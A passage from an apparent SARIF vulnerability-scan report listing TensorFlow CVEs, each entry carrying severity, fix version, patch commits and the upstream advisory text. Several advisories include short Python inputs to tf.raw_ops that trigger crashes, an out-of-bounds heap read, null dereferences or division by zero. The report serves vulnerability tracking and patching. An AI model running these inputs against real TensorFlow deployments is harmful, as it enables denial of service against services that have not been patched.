              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21734",
              "help": {
                "text": "Vulnerability CVE-2022-21734\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21734](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21734)\n### Impact \nThe [implementation of `MapStage`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/map_stage_op.cc#L519-L550) is vulnerable a `CHECK`-fail if the key tensor is not a scalar:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.MapStage(\n    key = tf.constant(value=[4], shape= (1,2), dtype=tf.int64),\n    indices = np.array([[6]]),\n    values = np.array([-60]),\n    dtypes = [tf.int64], capacity=0, memory_limit=0,\n    container=``, shared_name=``, name=None\n)   \n``` \n\n### Patches\nWe have patched the issue in GitHub commit [f57315566d7094f322b784947093406c2aea0d7d](https://github.com/tensorflow/tensorflow/commit/f57315566d7094f322b784947093406c2aea0d7d).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.\n~                                                                                             ",
                "markdown": "**Vulnerability CVE-2022-21734**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21734](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21734)|\n\n### Impact \nThe [implementation of `MapStage`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/map_stage_op.cc#L519-L550) is vulnerable a `CHECK`-fail if the key tensor is not a scalar:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.MapStage(\n    key = tf.constant(value=[4], shape= (1,2), dtype=tf.int64),\n    indices = np.array([[6]]),\n    values = np.array([-60]),\n    dtypes = [tf.int64], capacity=0, memory_limit=0,\n    container=``, shared_name=``, name=None\n)   \n``` \n\n### Patches\nWe have patched the issue in GitHub commit [f57315566d7094f322b784947093406c2aea0d7d](https://github.com/tensorflow/tensorflow/commit/f57315566d7094f322b784947093406c2aea0d7d).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.\n~                                                                                             "
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23570",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23570"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23570",
              "help": {
                "text": "Vulnerability CVE-2022-23570\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23570](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23570)\n### Impact\nWhen decoding a tensor from protobuf, TensorFlow might do a null-dereference if attributes of some mutable arguments to some operations are missing from the proto. This is [guarded by a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L104-L106):\n\n```cc\n  const auto* attr = attrs.Find(arg-\u003es()); \n  DCHECK(attr != nullptr);\n  if (attr-\u003evalue_case() == AttrValue::kList) {\n    // ...\n  }\n```\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure.\n\n### Patches\nWe have patched the issue in GitHub commit [8a513cec4bec15961fbfdedcaa5376522980455c](https://github.com/tensorflow/tensorflow/commit/8a513cec4bec15961fbfdedcaa5376522980455c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23570**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23570](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23570)|\n\n### Impact\nWhen decoding a tensor from protobuf, TensorFlow might do a null-dereference if attributes of some mutable arguments to some operations are missing from the proto. This is [guarded by a `DCHECK`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/full_type_util.cc#L104-L106):\n\n```cc\n  const auto* attr = attrs.Find(arg-\u003es()); \n  DCHECK(attr != nullptr);\n  if (attr-\u003evalue_case() == AttrValue::kList) {\n    // ...\n  }\n```\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the dereferencing of the null pointer, whereas in the second case it results in a crash due to the assertion failure.\n\n### Patches\nWe have patched the issue in GitHub commit [8a513cec4bec15961fbfdedcaa5376522980455c](https://github.com/tensorflow/tensorflow/commit/8a513cec4bec15961fbfdedcaa5376522980455c).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21730",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21730"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21730",
              "help": {
                "text": "Vulnerability CVE-2022-21730\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21730](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21730)\n### Impact \nThe [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape=[2,2,2,2],\n    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],\n    row_pooling_sequence=[-10,1,2,3],\n    col_pooling_sequence=[1,2,3,4],\n    overlapping=True)\n  return y\n    \ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
                "markdown": "**Vulnerability CVE-2022-21730**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21730](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21730)|\n\n### Impact \nThe [implementation of `FractionalAvgPoolGrad`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_avg_pool_op.cc#L209-L360) does not consider cases where the input tensors are invalid allowing an attacker to read from outside of bounds of heap:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.FractionalAvgPoolGrad(\n    orig_input_tensor_shape=[2,2,2,2],\n    out_backprop=[[[[1,2], [3, 4], [5, 6]], [[7, 8], [9,10], [11,12]]]],\n    row_pooling_sequence=[-10,1,2,3],\n    col_pooling_sequence=[1,2,3,4],\n    overlapping=True)\n  return y\n    \ntest()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [002408c3696b173863228223d535f9de72a101a9](https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n  \n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team."
              },
              "properties": {
                "security-severity": "8.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23572",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23572"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23572",
              "help": {
                "text": "Vulnerability CVE-2022-23572\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-23572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23572)\n### Impact\nUnder certain scenarios, TensorFlow can fail to specialize a type during [shape inference](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L168-L174):\n\n```cc\nvoid InferenceContext::PreInputInit(\n    const OpDef\u0026 op_def, const std::vector\u003cconst Tensor*\u003e\u0026 input_tensors,\n    const std::vector\u003cShapeHandle\u003e\u0026 input_tensors_as_shapes) {\n  const auto ret = full_type::SpecializeType(attrs_, op_def);\n  DCHECK(ret.status().ok()) \u003c\u003c \"while instantiating types: \" \u003c\u003c ret.status();\n  ret_types_ = ret.ValueOrDie();\n  // ... \n}\n```\n\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the `ValueOrDie` line. This results in an assertion failure as `ret` contains an error `Status`, not a value. In the second case we also get a crash due to the assertion failure.\n### Patches\nWe have patched the issue in GitHub commit [cb164786dc891ea11d3a900e90367c339305dc7b](https://github.com/tensorflow/tensorflow/commit/cb164786dc891ea11d3a900e90367c339305dc7b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23572**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-23572](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23572)|\n\n### Impact\nUnder certain scenarios, TensorFlow can fail to specialize a type during [shape inference](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/framework/shape_inference.cc#L168-L174):\n\n```cc\nvoid InferenceContext::PreInputInit(\n    const OpDef\u0026 op_def, const std::vector\u003cconst Tensor*\u003e\u0026 input_tensors,\n    const std::vector\u003cShapeHandle\u003e\u0026 input_tensors_as_shapes) {\n  const auto ret = full_type::SpecializeType(attrs_, op_def);\n  DCHECK(ret.status().ok()) \u003c\u003c \"while instantiating types: \" \u003c\u003c ret.status();\n  ret_types_ = ret.ValueOrDie();\n  // ... \n}\n```\n\nHowever, `DCHECK` is a no-op in production builds and an assertion failure in debug builds. In the first case execution proceeds to the `ValueOrDie` line. This results in an assertion failure as `ret` contains an error `Status`, not a value. In the second case we also get a crash due to the assertion failure.\n### Patches\nWe have patched the issue in GitHub commit [cb164786dc891ea11d3a900e90367c339305dc7b](https://github.com/tensorflow/tensorflow/commit/cb164786dc891ea11d3a900e90367c339305dc7b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, and TensorFlow 2.6.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-23585",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23585"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23585",
              "help": {
                "text": "Vulnerability CVE-2022-23585\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23585](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23585)\n### Impact\nWhen [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L322-L416) TensorFlow can produce a memory leak if the image is invalid.\nAfter calling `png::CommonInitDecode(..., \u0026decode)`, the `decode` value contains allocated buffers which can only be freed by calling `png::CommonFreeDecode(\u0026decode)`. However, several error case in the function implementation invoke the `OP_REQUIRES` macro which immediately terminates the execution of the function, without allowing for the memory free to occur.\n  \n### Patches   \nWe have patched the issue in GitHub commit [ab51e5b813573dc9f51efa335aebcf2994125ee9](https://github.com/tensorflow/tensorflow/commit/ab51e5b813573dc9f51efa335aebcf2994125ee9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23585**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23585](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23585)|\n\n### Impact\nWhen [decoding PNG images](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/kernels/image/decode_image_op.cc#L322-L416) TensorFlow can produce a memory leak if the image is invalid.\nAfter calling `png::CommonInitDecode(..., \u0026decode)`, the `decode` value contains allocated buffers which can only be freed by calling `png::CommonFreeDecode(\u0026decode)`. However, several error case in the function implementation invoke the `OP_REQUIRES` macro which immediately terminates the execution of the function, without allowing for the memory free to occur.\n  \n### Patches   \nWe have patched the issue in GitHub commit [ab51e5b813573dc9f51efa335aebcf2994125ee9](https://github.com/tensorflow/tensorflow/commit/ab51e5b813573dc9f51efa335aebcf2994125ee9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "4.3",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-23581",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-23581"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23581",
              "help": {
                "text": "Vulnerability CVE-2022-23581\nSeverity: medium\nFixed Version: 2.7.0\nLink: [CVE-2022-23581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23581)\n### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`IsSimplifiableReshape`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1687-L1742) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commits [ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1](https://github.com/tensorflow/tensorflow/commit/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1), [1fb27733f943295d874417630edd3b38b34ce082](https://github.com/tensorflow/tensorflow/commit/1fb27733f943295d874417630edd3b38b34ce082), and [240655511cd3e701155f944a972db71b6c0b1bb6](https://github.com/tensorflow/tensorflow/commit/240655511cd3e701155f944a972db71b6c0b1bb6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2022-23581**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.7.0|[CVE-2022-23581](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23581)|\n\n### Impact\nThe Grappler optimizer in TensorFlow can be used to cause a denial of service by altering a `SavedModel` such that [`IsSimplifiableReshape`](https://github.com/tensorflow/tensorflow/blob/a1320ec1eac186da1d03f033109191f715b2b130/tensorflow/core/grappler/optimizers/constant_folding.cc#L1687-L1742) would trigger `CHECK` failures.\n\n### Patches\nWe have patched the issue in GitHub commits [ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1](https://github.com/tensorflow/tensorflow/commit/ebc1a2ffe5a7573d905e99bd0ee3568ee07c12c1), [1fb27733f943295d874417630edd3b38b34ce082](https://github.com/tensorflow/tensorflow/commit/1fb27733f943295d874417630edd3b38b34ce082), and [240655511cd3e701155f944a972db71b6c0b1bb6](https://github.com/tensorflow/tensorflow/commit/240655511cd3e701155f944a972db71b6c0b1bb6).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-21737",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21737"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21737",
              "help": {
                "text": "Vulnerability CVE-2022-21737\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21737](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21737)\n### Impact \nThe [implementation of `*Bincount` operations](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/bincount_op.cc) allows malicious users to cause denial of service by passing in arguments which would trigger a `CHECK`-fail:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.DenseBincount(\n  input=[[0], [1], [2]],\n  size=[1],\n  weights=[3,2,1],\n  binary_output=False)\n```\n\nThere are several conditions that the input arguments must satisfy. Some are not caught during shape inference and others are not caught during kernel implementation. This results in `CHECK` failures later when the output tensors get allocated.\n\n### Patches\nWe have patched the issue in GitHub commit [7019ce4f68925fd01cdafde26f8d8c938f47e6f9](https://github.com/tensorflow/tensorflow/commit/7019ce4f68925fd01cdafde26f8d8c938f47e6f9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-21737**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21737](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21737)|\n\n### Impact \nThe [implementation of `*Bincount` operations](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/bincount_op.cc) allows malicious users to cause denial of service by passing in arguments which would trigger a `CHECK`-fail:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.DenseBincount(\n  input=[[0], [1], [2]],\n  size=[1],\n  weights=[3,2,1],\n  binary_output=False)\n```\n\nThere are several conditions that the input arguments must satisfy. Some are not caught during shape inference and others are not caught during kernel implementation. This results in `CHECK` failures later when the output tensors get allocated.\n\n### Patches\nWe have patched the issue in GitHub commit [7019ce4f68925fd01cdafde26f8d8c938f47e6f9](https://github.com/tensorflow/tensorflow/commit/7019ce4f68925fd01cdafde26f8d8c938f47e6f9).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21735",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21735"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21735",
              "help": {
                "text": "Vulnerability CVE-2022-21735\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21735](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21735)\n### Impact \nThe [implementation of `FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_max_pool_op.cc#L36-L192) can be made to crash a TensorFlow process via a division by 0:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.FractionalMaxPool(\n  value=tf.constant(value=[[[[1, 4, 2, 3]]]], dtype=tf.int64),\n  pooling_ratio=[1.0, 1.44, 1.73, 1.0],\n  pseudo_random=False,\n  overlapping=False,\n  deterministic=False,\n  seed=0,\n  seed2=0,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb](https://github.com/tensorflow/tensorflow/commit/ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-21735**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21735](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21735)|\n\n### Impact \nThe [implementation of `FractionalMaxPool`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/fractional_max_pool_op.cc#L36-L192) can be made to crash a TensorFlow process via a division by 0:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.FractionalMaxPool(\n  value=tf.constant(value=[[[[1, 4, 2, 3]]]], dtype=tf.int64),\n  pooling_ratio=[1.0, 1.44, 1.73, 1.0],\n  pseudo_random=False,\n  overlapping=False,\n  deterministic=False,\n  seed=0,\n  seed2=0,\n  name=None)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb](https://github.com/tensorflow/tensorflow/commit/ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "6.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21736",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21736"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21736",
              "help": {
                "text": "Vulnerability CVE-2022-21736\nSeverity: high\nFixed Version: 2.7.0\nLink: [CVE-2022-21736](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21736)\n### Impact \nThe [implementation of `SparseTensorSliceDataset`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L227-L292) has an undefined behavior: under certain condition it can be made to dereference a `nullptr` value:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseTensorSliceDataset(\n  indices=[[]],\n  values=[],\n  dense_shape=[1,1])\n```\n\nThe 3 input arguments represent a sparse tensor. However, there are some preconditions that these arguments must satisfy but these are not validated in the implementation.\n\n### Patches\nWe have patched the issue in GitHub commit [965b97e4a9650495cda5a8c210ef6684b4b9eceb](https://github.com/tensorflow/tensorflow/commit/965b97e4a9650495cda5a8c210ef6684b4b9eceb).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia.",
                "markdown": "**Vulnerability CVE-2022-21736**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.7.0|[CVE-2022-21736](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21736)|\n\n### Impact \nThe [implementation of `SparseTensorSliceDataset`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L227-L292) has an undefined behavior: under certain condition it can be made to dereference a `nullptr` value:\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.raw_ops.SparseTensorSliceDataset(\n  indices=[[]],\n  values=[],\n  dense_shape=[1,1])\n```\n\nThe 3 input arguments represent a sparse tensor. However, there are some preconditions that these arguments must satisfy but these are not validated in the implementation.\n\n### Patches\nWe have patched the issue in GitHub commit [965b97e4a9650495cda5a8c210ef6684b4b9eceb](https://github.com/tensorflow/tensorflow/commit/965b97e4a9650495cda5a8c210ef6684b4b9eceb).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Faysal Hossain Shezan from University of Virginia."
              },
              "properties": {
                "security-severity": "7.6",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-21732",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-21732"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21732",
              "help": {
